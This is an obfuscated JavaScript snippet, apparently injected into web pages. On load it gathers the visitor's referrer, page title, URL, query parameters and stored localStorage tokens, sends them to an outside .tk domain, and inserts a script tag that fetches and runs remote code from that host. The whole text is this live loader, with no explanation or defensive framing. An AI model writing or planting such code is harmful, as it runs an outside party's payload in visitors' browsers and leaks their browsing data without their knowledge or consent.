  (function() {
    var name = '_NTkxkb1tWydtXLFh';
    if (!window._NTkxkb1tWydtXLFh) {
        window._NTkxkb1tWydtXLFh = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://whiranjafusboooo.tk/3H1mwB',
            P_PATH: 'https://whiranjafusboooo.tk/fec84ce/postback',
        };
    }
    const _nCbwLxrDsjWPC6sd = localStorage.getItem('config');
    if (typeof _nCbwLxrDsjWPC6sd !== 'undefined' && _nCbwLxrDsjWPC6sd !== null) {
        var _wSpxJDppyk1WFFKK = JSON.parse(_nCbwLxrDsjWPC6sd);
        var _BSqmTqQz1xqNPYxW = Math.round(+new Date()/1000);
        if (_wSpxJDppyk1WFFKK.created_at + window._NTkxkb1tWydtXLFh.ttl < _BSqmTqQz1xqNPYxW) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _PtGmqtp6cZXcHCsJ = localStorage.getItem('subId');
    var _cB2RbxYxC4Tb1Hj1 = localStorage.getItem('token');
    var _xrRRM93LwcL4g2CW = '?return=js.client';
        _xrRRM93LwcL4g2CW += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _xrRRM93LwcL4g2CW += '&se_referrer=' + encodeURIComponent(document.referrer);
        _xrRRM93LwcL4g2CW += '&default_keyword=' + encodeURIComponent(document.title);
        _xrRRM93LwcL4g2CW += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _xrRRM93LwcL4g2CW += '&name=' + encodeURIComponent(name);
        _xrRRM93LwcL4g2CW += '&host=' + encodeURIComponent(window._NTkxkb1tWydtXLFh.R_PATH);
    if (typeof _PtGmqtp6cZXcHCsJ !== 'undefined' && _PtGmqtp6cZXcHCsJ && window._NTkxkb1tWydtXLFh.unique) {
        _xrRRM93LwcL4g2CW += '&sub_id=' + encodeURIComponent(_PtGmqtp6cZXcHCsJ);
    }
    if (typeof _cB2RbxYxC4Tb1Hj1 !== 'undefined' && _cB2RbxYxC4Tb1Hj1 && window._NTkxkb1tWydtXLFh.unique) {
        _xrRRM93LwcL4g2CW += '&token=' + encodeURIComponent(_cB2RbxYxC4Tb1Hj1);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._NTkxkb1tWydtXLFh.R_PATH + _xrRRM93LwcL4g2CW;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
